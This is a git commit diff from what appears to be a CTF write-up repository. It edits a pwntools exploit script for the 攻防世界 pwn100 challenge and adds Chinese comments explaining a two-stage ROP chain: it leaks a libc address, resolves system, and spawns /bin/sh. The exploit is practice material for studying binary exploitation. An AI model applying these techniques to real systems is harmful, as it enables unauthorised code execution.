1016852a73d719e667e401b81776457994ffd8b4
dajun <2809704352@qq.com>
2019-08-14 11:55:54 +0800

    modified exp

--- Articles/2019-6-11-攻防世界-pwn100-writeup/Src/exp.py
+++ Articles/2019-6-11-攻防世界-pwn100-writeup/Src/exp.py
@@ -20,13 +20,13 @@ pop_rdi = 0x0000000000400763
 pop_rsi_r15 = 0x0000000000400761
 
 def stageone():
-    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(read_got) \
-	+p64(put_plt)+p64(pop_rdi)+p64(bss) \
-	+p64(pop_rsi_r15)+p64(7)+p64(0)+p64(readn)+p64(start)
-    payload += "A"*(max_length-len(payload))
+    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(read_got) \	#pop_rdi后紧接read_got，就把read_got传入了rdi，作为参数
+	+p64(put_plt)+p64(pop_rdi)+p64(bss) \	#上一行执行ret的时候就跳转到puts_plt，执行到现在就类似于执行了一个puts(read_got)
+	+p64(pop_rsi_r15)+p64(7)+p64(0)+p64(readn)+p64(start)	#这一行也类似，上一行把bss的地址pop入rdi，然后把7pop入rsi，然后执行readn，就类似于执行了readn(bss，7)
+    payload += "A"*(max_length-len(payload))	#这里就是填充
     io.send(payload)
     sleep(1)
-    io.send("/bin/sh")
+    io.send("/bin/sh")		#payload送出去以后，会先puts，然后执行readn(bss,7)，所以就要再送入/bin/sh字符串
     print io.recvuntil("bye~")
     return u64(io.recv()[1:-1].ljust(8,'\0'))
 
@@ -36,19 +36,13 @@ print "read address: ", hex(read_addr)
 libc = LibcSearcher("read",read_addr)
 libc_base = read_addr - libc.dump("read")
 system_addr = libc_base + libc.dump("system")
-sys = p64(system_addr)
 print "system address: ",hex(system_addr)
 
 def stagetwo():
-    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(put_got) \
-	+p64(pop_rsi_r15)+p64(len(sys))+p64(0)+p64(readn)+p64(pop_rdi)+p64(bss) \
+    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(bss) \	#将bss的地址即/bin/sh字符串的地址传给rdi作为第一个参数，然后直接执行system，就相当于执行了system("/bin/sh")，然后getshell
 	+p64(system_addr)+p64(start)
     payload += "A"*(max_length-len(payload))
     io.send(payload)
-    print io.recv()
-    io.send(sys)
-    
 
 stagetwo()
 io.interactive()
-
